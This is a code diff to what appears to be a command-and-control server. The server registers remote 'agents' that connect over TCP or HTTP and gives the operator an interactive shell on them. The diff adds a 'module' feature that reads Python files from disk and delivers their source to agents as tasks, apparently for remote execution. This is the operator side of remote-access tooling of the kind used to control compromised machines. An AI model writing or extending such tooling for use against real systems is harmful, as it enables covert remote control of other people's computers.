@@ -1,7 +1,7 @@
 from core.utils.config import CONFIG
 from core.agents import commands
 from core.agents.utils import task as taskmng
-from core.utils import common
+from core.utils import common, log
 from core.transport import tcp, http
 
 from dataclasses import dataclass, field
@@ -76,7 +76,7 @@ def handle_tcp(conn, addr):
     )
 
     AGENTS[id] = agent
-    print(f"[+] New tcp agent connected: {agent}")
+    log.info(f"New {agent.conn_type} agent connected: ID: {agent.id}, IP:{agent.ip} ")
 
 
 
@@ -103,8 +103,8 @@ def handle_http(req):
     )
 
     AGENTS[id] = agent
-    print(f"[+] New http agent connected: {agent}")
-    return http.generate_response()
+    log.info(f"New {agent.conn_type} agent connected: ID: {agent.id}, IP:{agent.ip} ")
+    return http.generate_response(data=agent.id)
 
 
 def handle_interact(conn, id):
@@ -154,10 +154,18 @@ def handle_interact(conn, id):
                     
                 case ["shell"]:
                     header = commands.AGENT_COMMANDS.get("shell")["header"]
-                    response = commands.shell(conn, agent)
+                    response = commands.shell(conn, agent, conn_type)
                     tcp.send_data(conn, response, header)
                     tcp.send_data(conn, " ")
 
+                case ["module"]:
+                    response = commands.module_help()
+                    tcp.send_data(conn, response)
+                    
+                case ["module", arg]:
+                    response = commands.module(agent, arg, conn_type)
+                    tcp.send_data(conn, response)
+                    
                 case ["exit"]:
                     return commands.exit()
                     
@@ -209,7 +217,7 @@ def handle_auth():
     
 def handle_task():
     req = extract_request()
-    agent_id = req.args.get("id", "")
+    agent_id = req.args.get("X-Agent-Id", "")
     if not agent_id:
         return http.generate_response(data="None",status=400)
 
@@ -217,10 +225,13 @@ def handle_task():
     if not task:
         return http.generate_response(data="None")
     
-    header = commands.AGENT_COMMANDS.get(task.command, "")
-    if header:
-        header = header["header"]
+    header = task.header
 
+    if task.command in commands.MODULE_FILES:
+        with open(f"{commands.MODULE_FOLDER}/{task.command}.py","r") as f:
+            module = f.read()
+        return http.generate_response(task.id, module, header)
+    
     return http.generate_response(task.id, task.command, header)
     
 
